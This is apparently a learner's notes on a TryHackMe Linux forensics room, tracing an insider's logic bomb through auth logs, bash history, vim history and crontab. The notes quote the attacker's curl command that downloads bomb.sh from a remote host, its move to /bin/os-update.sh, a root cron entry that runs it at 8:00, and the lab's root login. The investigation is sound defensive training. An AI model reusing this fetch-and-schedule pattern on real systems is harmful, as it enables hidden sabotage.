https://tryhackme.com/room/disgruntled

Task 1 is a joke. 
Task 2 is kind of a joke, required to download a linux cheat sheet. 


Machine ip is 10.10.159.183

Starting with the basic nmap command to see whats open Hopefully ftp or ssh to answer the first questions.
3.1 The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND? 
Hint Check the sudo execution history.

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-06 09:37 EST
Nmap scan report for 10.10.159.183
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7017664637ba72063015a2dbc94aa0b (RSA)
|   256 9b6ddd5dbe7da8bce41ab3f50263faaf (ECDSA)
|_  256 3f9173c4a1334f51891cbd7636a1032a (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.70 seconds

Checking http first 
Greeted to a default apache page. 
Checked back with the first page and I see 


Username: root
Password:password 

Must be for ssh…. It is.

The authenticity of host '10.10.159.183 (10.10.159.183)' can't be established.
ED25519 key fingerprint is SHA256:RbLrnrOaR7wKbTMBDiVCw9r0m7ukNB/3Q5pzDHdxDXU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.159.183' (ED25519) to the list of known hosts.
root@10.10.159.183's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.4.0-1029-aws x86_64)

 Ls returns a filder called snap holding amazon-ssm-agent? Weird
Found the /etc page that holds allot of items. 
Things that stand out, cron tabs because o scheduled taksa from the previous person. 
Going to try and gfigure out system logs with the log files potion of the document.
Cat /var/log/syslog


Shows allot of info and logs. I immediately see info on the amson ssm agent. 
Got stuck in vim authentication logs before looking up https://superuser.com/questions/1481437/show-sudo-history-in-history-command
Found In Debian I have /var/log/auth.log. Commands run with sudo are logged there. In CentOS it may be /var/log/secure, I'm not sure. (This is published as a comment, not an answer, because the mentioned file doesn't store what you type in an elevated shell after sudo -i; a good answer should cover this as well.)


Found /usr/bin/apt install dokuwiki that looks weird, is run with sudo and matches the command description.
/usr/bin/apt install dokuwiki


3.2 What was the present working directory (PWD) when the previous command was run?
/home/cybert on the same command line as the previous answer. 


4.1Which user was created after the package from the previous task was installed? 
Found this log after looking 28 06:26:53 ip-10-10-168-55 groupadd[15324]: group added to /etc/group: name=it-admin, GID=1002
it-admin


4.2A  user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)
A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS) this looks weird
Hint The "visudo" is called when editing the /etc/sudoers file. Look for this command in the logs.
Dec 28 06:27:34

4.3 A script file was opened using the "vi" text editor. What is the name of this file?
May be: A script file was opened using the "vi" text editor. What is the name of this file?
bomb.sh

5.1 What is the command used that created the file bomb.sh?
Tried searching within the sys llogs for other instances of the bomb.sh file, but tno luck.
Hint The command was run by a different user account. Look at the ".bash_history" found in the user's home directory.
Hint helped, doesn’t help searching logs for root, switched the input to it-admin which pulled up. 


root@ip-10-10-159-183:~# vim /home/it-admin/.bash_history
w whoami
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
ls
ls -la
cd ~/
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
sudo vi bomb.sh
ls
rm bomb.sh
sudo nano /etc/crontab
exit
~             
Found curl 10.10.158.38:8080/bomb.sh --output bomb.sh

5.2 The file was renamed and moved to a different directory. What is the full path of this file now?
Found the command 
All the commands which you executed in vi are in the file .viminfo , which is in your home directory .

vim /home/user/.viminfo.

It has lot of vi details includes the command history .
The command is root@ip-10-10-159-183:~# vim /home/it-admin/.viminfo
Because again we are searching the changed history for it-admin for vi. 
Found :saveas /bin/os-update.sh

5.3 When was the file from the previous question last modified? (Format: Month Day HH:MM)
Most likely need to go back into the syslogs and search for update.sh.
No results.
Hint Go to the file location and use the "ls -al" command.
Ran and found -rw-r--r-- 1 root root 325 Dec 28  2022 /bin/os-update.sh
Dec 28 06:29

5.4 What is the name of the file that will get created when the file from the first question executes? 
Checking out the cron history and the location for the update.os.sh file.
Command is 
Opening  in vim and we see root@ip-10-10-159-183:/home/it-admin# vim /bin/os-update.sh
        echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! HAHAHAHA\n-mistermeist3r" > /goodbye.txt


6.1 At what time will the malicious file trigger? (Format: HH:MM AM/PM) 
Hint: Check out the crontab and convert the schedule expression using a site like https://crontab.guru/.
Need to find history for expression.
Found with the doc earlier, command is :
root@ip-10-10-159-183:/home/it-admin# vim /etc/crontab
results are # /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
0 8     * * *   root    /bin/os-update.sh
#
Need to convert cron with web page
Page says 8:00am, that ios the answer.


Task 7 is a joke
